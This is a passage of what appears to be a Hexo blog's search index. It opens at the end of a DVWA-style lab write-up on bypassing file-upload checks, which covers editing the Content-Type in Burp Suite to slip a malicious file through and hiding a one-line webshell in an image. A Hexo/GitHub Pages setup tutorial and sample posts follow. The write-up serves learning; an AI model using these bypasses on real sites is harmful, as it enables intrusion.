src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image18.png" alt="image18"></p><p>点<strong>工具-&gt;选项</strong>，然后下拉至<strong>网络设置-&gt;设置</strong></p><p>设置好代理，地址为安装burpsuite机器的IP地址</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image19.png" alt="image19"></p><p>此时在设置好代理的机器上还能打开那个网页</p><p>我们将burpsuite的拦截服务打开</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image20.png" alt="image20"></p><p>这样设置好代理的机器上就不能打开那个网页了。但是我们此时上传这个恶意文件的话，文件就会被这个代理服务器拦截下来</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image21.png" alt="image21"></p><p>这里可见文件不是立即返回上传不成功，而是在加载，这时我们可以在burpsuite上看到这个文件</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image22.png" alt="image22"></p><p><em><strong>这里我们将Content-Type:application/octet-stream</strong></em></p><p>改为<em><strong>Content-Type:image/jpeg</strong></em></p><p>然后点击<em><strong>Forward</strong></em>上传，这时恶意文件就上传成功了！</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image23.png" alt="image23"></p><p>然后同low级别的操作就成功入侵靶机！</p><h3 id="文件上传漏洞渗透及防御的学习——安全级别为medium-1"><a href="#文件上传漏洞渗透及防御的学习——安全级别为medium-1" class="headerlink" title="文件上传漏洞渗透及防御的学习——安全级别为medium"></a>文件上传漏洞渗透及防御的学习——安全级别为medium</h3><p>将安全级别调至high，查看后端代码</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image24.png" alt="image24"></p><p>此时直接对文件的后缀进行了限制，我们无法再像第二步那样操作，因为我们必须得对文件后缀进行修改，这样会导致文件不可用。</p><p>可行方法：上传带有一句话木马程序的图片，即信息隐藏！</p><p>初步学习完毕！</p>]]></content>
      
      
      <categories>
          
          <category> web安全渗透学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小白，学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>个人博客的搭建——初步</title>
      <link href="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/"/>
      <url>/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="一-什么是Hexo"><a href="#一-什么是Hexo" class="headerlink" title="一.什么是Hexo?"></a>一.<strong>什么是Hexo?</strong></h2><p>Hexo是一款基于Node.js的静态博客框架，依赖少易于安装使用，可以方便的生成静态网页托管在GitHub和Heroku上，是搭建博客的首选框架。这里我选用的是GitHub作为我博客的服务器，搭建环境为<strong>Windows10</strong>，同时Hexo也是GitHub上的开源项目，可以参见<u>hexojs/hexo</u>。</p><p>搭建完毕后的个人博客地址:<a href="http://www.zymstudy.club/">www.zymstudy.club</a></p><h2 id="二-搭建大致步骤："><a href="#二-搭建大致步骤：" class="headerlink" title="二.搭建大致步骤："></a>二.<strong>搭建大致步骤：</strong></h2><ol><li><p>获得个人网站的域名</p></li><li><p>GitHub创建个人仓库</p></li><li><p>安装Git</p></li><li><p>安装Node.js</p></li><li><p>安装Hexo</p></li><li><p>推送网站</p></li><li><p>绑定域名</p></li><li><p>更换主题</p></li><li><p>熟悉MarkDown语法</p></li><li><p>发布文章</p></li><li><p>寻找图床</p></li><li><p>个性化设置</p></li><li><p>其他附录</p><h3 id="1-获得个人网站域名"><a href="#1-获得个人网站域名" class="headerlink" title="1.获得个人网站域名"></a>1.<strong>获得个人网站域名</strong></h3></li></ol><p>域名是网站的入口，也是网站的第一印象，比如饿了么官网的域名是<u>ele.me</u>,常见的域名后缀有com,cn,net,org等，也有一些比较少见的如xyz,me,io等，这些域名是我们自己申请的，由于大陆监管较为严格，因此一些比较少见的域名后缀在大陆是无法备案的，因此网站也无法上线。但是使用GitHub来作为服务器来托管我们自己的网站是不需要备案的，因为GitHub是国外项目，这样托管我们网站内容的服务器在美国，就不需要在大陆备案。</p><p>申请域名的地方有很多，比如阿里云、腾讯云和百度云等等。我这个个人博客的网站域名是在腾讯云那里购买的，腾讯云地址：<a href="https://cloud.tencent.com/%E3%80%82">https://cloud.tencent.com/。</a></p><h3 id="2-GitHub创建个人仓库"><a href="#2-GitHub创建个人仓库" class="headerlink" title="2.GitHub创建个人仓库"></a><strong>2.GitHub创建个人仓库</strong></h3><p>登录到GitHub，创建个人GitHub账号，然后点击GitHub的New repository来创建新仓库，此处仓库命名规则：<strong>用户名.github.io</strong>，这里用户名是你的github账号名称，比如我这里的仓库名为：<strong>zym1290190720.github.io</strong></p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image1.png" alt="image1"></p><h3 id="3-安装Git"><a href="#3-安装Git" class="headerlink" title="3.安装Git"></a><strong>3.安装Git</strong></h3><p>什么是Git?简单来说Git是开源的分布式版本控制系统，用于敏捷高效地处理项目。我们网站在本地搭建好了，需要使用Git同步到GitHub上。如果想要了解Git的细节，可以参看<a href="https://weibo.com/liaoxuefeng">廖雪峰</a>老师的Git教程：<a href="https://www.liaoxuefeng.com/wiki/896043488029600">Git教程</a>。</p><p>Git从官网上下载:<a href="https://git-scm.com/download/win">Git-Downloading Package</a>。选择64位的安装包，下载后安装，然后可以在命令行里测试git是否安装成功：<code>git --version</code>，安装成功的话会显示版本号，比如我这里：</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image2.png" alt="image2"></p><p>若安装失败，请自行参考其他详细的Git安装教程，安装成功后，将自己的Git与GitHub账号绑定，鼠标右键打开Git Bash</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/.%5C%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5%5Cimage3.png" alt="image3"></p><p>（这里截图的方式：鼠标右键呼出菜单栏，鼠标左键按住某个选项，再Ctrl+shift+A即可）</p><p><strong>进入设置user.name和user.email配置信息:</strong></p><p><code>git config --global user.name &quot;你的GitHub用户名&quot;</code></p><p><code>git config --global user.email &quot;你的GitHub注册邮箱&quot;</code></p><p><strong>生成ssh密钥文件：</strong></p><p><code>ssh-keygen -t rsa -C &quot;你的GitHub注册邮箱&quot;</code></p><p>输入后直接按三个回车键，默认的不需要设置密码</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image4.png" alt="image4"></p><p>然后找到生成的.ssh的文件夹中的id_rsa.pub密钥，将内容全部复制</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image5.png" alt="image5"></p><p>打开GitHub的Settings-SSH and GPG keys-New SSH key</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image1.png" alt="image6"></p><p>点击Add SSH key，可以在Git Bash窗口中检测GitHub公钥设置是否成功，输入</p><p><code>ssh git@github.com</code></p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image7.png" alt="image7"></p><p>出现Hi github账号名，说明设置成功！</p><p>这里之所以设置GitHub密钥原因是，通过非对称加密的公钥与私钥来完成加密，公钥放置在GitHub上，私钥放置在自己的电脑里。GitHub要求每次推送代码都是合法用户，所以每次推送都需要输入账号密码验证推送用户是否是合法用户，为了省去每次输入密码的步骤，采用了ssh，当你推送的时候，git就会匹配你的私钥跟GitHub上面的公钥是否是配对的，若是匹配就认为你是合法用户，则允许推送。这样可以保证每次的推送都是正确合法的。</p><h3 id="4-安装Node-js"><a href="#4-安装Node-js" class="headerlink" title="4.安装Node.js"></a><strong>4.安装Node.js</strong></h3><p>Hexo基于Node.js，Node.js的下载地址：<a href="https://nodejs.org/en/download/">Download|Node.js</a>，注意安装Node.js会包含环境变量及npm的安装，安装后，检测Node.js是否安装成功，在命令行输入<code>node -v</code></p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image8.png" alt="image8"></p><p>检测npm是否安装成功，在命令行输入<code>npm -v</code></p><p>至此，安装Hexo的环境已经全部搭建完成！</p><h3 id="5-安装Hexo"><a href="#5-安装Hexo" class="headerlink" title="5.安装Hexo"></a><strong>5.安装Hexo</strong></h3><p>Hexo就是我们的个人博客网站的框架， 这里需要自己在电脑常里创建一个文件夹，可以命名为blog，比如我在D盘新建文件夹blog，Hexo框架与以后你自己发布的网页都在这个文件夹中。创建好后，进入文件夹中，按住shift键，右击鼠标点击命令行。</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image9.png" alt="image9"></p><p>使用npm命令安装Hexo，输入：<code>npm install -g hexo-cli</code></p><p>安装时间较长，安装完成后，初始化我们的博客，输入：<code>hexo init blog</code></p><p>注意，这里的命令都是作用在刚刚创建的blog文件夹中。</p><p>为了检测我的网站雏形，分别按顺序输入以下三条命令：</p><p><code>hexo new test_my_site</code></p><p><code>hexo g</code></p><p><code>hexo s</code></p><p>这些命令在后面作介绍，完成后，打开浏览器输入地址：</p><p><code>127.0.0.1:4000</code></p><p>就能看到我们的网站雏形。</p><p><strong>现在来介绍常用的Hexo 命令</strong></p><p><code>npm install hexo -g #安装Hexo</code><br><code>npm update hexo -g #升级</code><br><code>hexo init #初始化博客</code></p><p><strong>命令简写</strong><br><code>hexo n &quot;我的博客&quot; == hexo new &quot;我的博客&quot; #新建文章</code><br><code>hexo g == hexo generate #生成</code><br><code>hexo s == hexo server #启动服务预览</code><br><code>hexo d == hexo deploy #部署</code></p><p><code>hexo server #Hexo会监视文件变动并自动更新，无须重启服务器</code><br><code>hexo server -s #静态模式</code><br><code>hexo server -p 5000 #更改端口</code><br><code>hexo server -i 192.168.1.1 #自定义 IP</code><br><code>hexo clean #清除缓存，若是网页正常情况下可以忽略这条命令</code></p><p>刚刚的三个命令依次是新建一篇博客文章、生成网页、在本地预览的操作。</p><h3 id="6-推送网站"><a href="#6-推送网站" class="headerlink" title="6.推送网站"></a><strong>6.推送网站</strong></h3><p>上面只是在本地预览，接下来要做的就是就是推送网站，也就是发布网站，让我们的网站可以被更多的人访问。在设置之前，需要解释一个概念，在blog根目录里的_config.yml文件称为<strong>站点配置文件</strong>，如下图</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image10.png" alt="image10"></p><p>进入根目录里的themes文件夹，里面也有个_config.yml文件，这个称为<strong>主题配置文件</strong>，如下图</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image11.png" alt="image11"></p><p>（注意，我这里是安装了next主题样式，所以会出现next的文件夹）</p><p>下一步将我们的Hexo与GitHub关联起来，打开<strong>站点配置文件</strong>，翻到最后修改为：</p><p>deploy:<br>type: git<br>repo: 这里填入你之前在GitHub上创建仓库的完整路径，记得加上 .git<br>branch: main</p><p>参考如下：</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image12.png" alt="image12"></p><p>保存站点配置文件。</p><p>其实就是给hexo d 这个命令做相应的配置，让hexo知道你要把blog部署在哪个位置，很显然，我们部署在我们GitHub的仓库里。最后安装Git部署插件，输入命令：</p><p><code>npm install hexo-deployer-git --save</code></p><p>这时，我们分别输入三条命令：</p><p><code>hexo clean</code></p><p><code>hexo g</code></p><p><code>hexo d</code></p><p>其实第三条的 hexo d 就是部署网站命令，d是deploy的缩写。完成后，打开浏览器，在地址栏输入你的放置个人网站的仓库路径，即xxx.github.io比如我的xxx就是我的GitHub用户名。</p><p>你就会发现你的博客已经上线了，可以在网络上访问了。</p><h3 id="7-绑定域名"><a href="#7-绑定域名" class="headerlink" title="7.绑定域名"></a><strong>7.绑定域名</strong></h3><p>此时GitHub绑定完成后，我们可以在网上输入zym1290190720.github.io来访问我们的个人博客，但这个域名看起来很傻且难记，于是我们可以去某云上去购买一个自己的域名，我这里是在腾讯云上购买了一个域名：zymstudy.club</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image14.png" alt="image14"></p><p>然后进行域名解析，定向到自己的github仓库地址。</p><p>接着登录GitHub，设置Custom domain，输入自己的域名</p><p>最后进入本地博客文件夹 ，进入blog/source目录下，创建一个记事本文件，输入你的域名，对，只要写进你自己的域名即可。如果带有www，那么以后访问的时候必须带有www完整的域名才可以访问，但如果不带有www，以后访问的时候带不带www都可以访问。所以建议，不要带有www。</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image15.png" alt="image15"></p><h3 id="8-更换主题"><a href="#8-更换主题" class="headerlink" title="8.更换主题"></a><strong>8.更换主题</strong></h3><p>如果你不喜欢Hexo默认的主题，可以更换不同的主题，可以在blog目录中的themes文件夹中查看你自己主题是什么。现在把默认主题更改成Next主题，在blog目录中（就是命令行的位置处于blog目录）打开命令行输入：</p><p><code>git clone https://github.com/iissnan/hexo-theme-next themes/next</code></p><p>这是将Next主题下载到blog目录的themes主题下的next文件夹中。</p><p>打开<strong>站点配置文件</strong>，修改主题为next</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image16.png" alt="image16"></p><p>然后打开<strong>主题配置文件</strong>，找到Scheme Settings</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image17.png" alt="image17"></p><p>next主题有四个样式，我用的是Gemini，你们可以自己试试看，选择你自己喜欢的样式（只需要把行首的#去除，#是注释），选择好后，再次部署网站，hexo g、hexo d，查看效果。选择其他主题，按照上述过程即可实现。</p><h3 id="9-初识Markdown语法"><a href="#9-初识Markdown语法" class="headerlink" title="9.初识Markdown语法"></a><strong>9.初识Markdown语法</strong></h3><p>Markdown是一种可以使用普通文本编辑器编写的标记语言，通过简单的标记语法，它可以使普通文本内容具有一定的格式。Markdown语法简洁明了、容易掌握，而且功能比纯文本更强，因此写博客使用它，可以让用户更加专注的写文章，而不需要费尽心力的考虑样式，相对于html已经算是轻量级语言，像有道云笔记也支持Markdown写作。并且Markdown完全兼容html，也就是可以在文章里直接插入html代码。比如给博文添加音乐，就可以直接把音乐的外链html代码插入文章中。具体语法参看：<a href="https://link.zhihu.com/?target=http://www.appinn.com/markdown/">Markdown 语法说明(简体中文版)</a> 可以说十分钟就可以入门。当然，工欲善其事必先利其器，选择一个好的Markdown编辑器也是非常重要的，这里推荐<a href="https://link.zhihu.com/?target=http://code52.org/DownmarkerWPF/">MarkPad</a> 和<a href="https://link.zhihu.com/?target=http://www.markdownpad.com/">The Markdown Editor for Windows</a> ，这是带有预览效果的编辑器，也可以使用本地的文本编辑器，更多的Markdown的语法与编辑器自己可以搜索了解。</p><h3 id="10-发布文章"><a href="#10-发布文章" class="headerlink" title="10.发布文章"></a><strong>10.发布文章</strong></h3><p>进入Git Bash界面，输入命令：<code>hexo n 文章名</code></p><p>这样会在blog/source/_posts下面生成文章名.md和一个文章名的文件夹</p><p>我们在md文件里面就可以编写自己的文章了</p><p><strong>注意，这里加载图片有坑！</strong></p><p>由于我们是在md文件里面编写，因此这篇文章需要使用markdown语法文章，在文章中插入本地图片需要遵循markdown的语法，很有可能遇到使用绝对路径和相对路径，再部署到github上面图片无法显示的情况。</p><p><strong>解决办法：</strong></p><p>先安装插件，打开Git Bash界面，输入命令</p><p><code>npm install hexo-asset-image --save</code></p><p>安装第三方插件hexo-asset-image</p><p>然后修改<strong>站点配置文件</strong>，修改里面的post_asset+folder的值为true</p><p>新建文章，在文章名的文件夹里面放入要插入的图片，然后在md文件中引用该文件夹的图片，markdown插入图片的语法为<img src>，圆括号中的地址为同名文件夹中图片的文件名。</p><p>举例如下：</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image13.png" alt="image13"></p><h3 id="11-寻找图床"><a href="#11-寻找图床" class="headerlink" title="11.寻找图床"></a><strong>11.寻找图床</strong></h3><p>图床，当博文中有图片时，若是少量图片，可以直接把图片存放在source文件夹中，但这显然不合理的，因为图片会占据大量的存储的空间，加载的时候相对缓慢 ，这时考虑把博文里的图片上传到某一网站，然后获得外部链接，使用Markdown语法，/<strong><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/%E5%A4%96%E9%83%A8%E9%93%BE%E6%8E%A5" alt="图片信息"></strong>/ 完成图片的插入，这种网站就被成为图床。常见的简易的图床网站有：<a href="https://link.zhihu.com/?target=http://www.tietuku.com/">贴图库图片外链</a> 国内算比较好的图床我认为有两个：新浪微博和 <a href="https://link.zhihu.com/?target=https://www.qiniu.com/">七牛云</a> ，七牛云的使用方法可以参看其他文章。图床最重要的就是稳定速度快，所以在挑选图床的时候一定要仔细，下图是博文插入图片，使用图床外链的示例：</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image18.jpg" alt="image18"></p><h3 id="12-个性化设置"><a href="#12-个性化设置" class="headerlink" title="12.个性化设置"></a><strong>12.个性化设置</strong></h3><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image19.png" alt="image19"></p><p>依次是网站标题、副标题、网站描述、作者、网站头像外部链接、网站语言、时区等。</p><h1 id="问题1-hexo用法一直弹出hexo-help"><a href="#问题1-hexo用法一直弹出hexo-help" class="headerlink" title="问题1:hexo用法一直弹出hexo help"></a>问题1:hexo用法一直弹出hexo help</h1><p>问题出处：</p><p>由于启动hexo s后，打开本地博客界面，一直弹出问题：</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image20.png" alt="image20"></p><p>于是我去网上找教程，看到教程<a href="https://www.haoyizebo.com/posts/710984d0/">https://www.haoyizebo.com/posts/710984d0/</a></p><p>其中解决方法1是降级node</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image21.png" alt="image21"></p><p>brew是基于Mac的下载命令，我是Windows换的npm命令，但敲完后出现大问题！我的git bash无法执行hexo命令了！</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image22.png" alt="image22"></p><p>于是我进到D:\blog\node_modules.bin\node文件，发现是目录指向错误。</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image23.png" alt="image23"></p><p>然后我查看了其他人创建的hexo 博客目录，发现他们根本都没有node_modules.bin\node文件，于是我认为一定是在对node进行版本变更时windows系统给node做了一定的改动，增加了node_modules.bin\node文件（我猜的），因此我直接将这个文件删除，重新执行hexo命令，出现我现在这个问题，hexo命令失效！除了能查看hexo -v版本号，其他hexo命令全部弹出hexo用法的提示！</p><p>找遍网上各种教程依然无法解决，于是我查看了hexo的目录结构，发现package.json中没有hexo的信息标识，</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image24.png" alt="image24"></p><p>于是我往里面加入</p><p>  ``”hexo”: {<code>     </code>“version”: “5.4.0”<code>   &#125;,</code></p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image25.png" alt="image25"></p><p>重新输入hexo命令，成功！</p><p><img src="/2021/10/20/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E5%88%9D%E6%AD%A5/image26.png" alt="image26"></p>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小白，学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>my first post</title>
      <link href="/2021/10/20/my-first-post/"/>
      <url>/2021/10/20/my-first-post/</url>
      
        <content type="html"><![CDATA[<p>asdasdasd<a href="https://zym1290190720.github.io/">https://zym1290190720.github.io/</a>****</p><p><strong>asdas</strong>d</p><p>asdasdasd</p><p>asda</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/10/20/hello-world/"/>
      <url>/2021/10/20/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
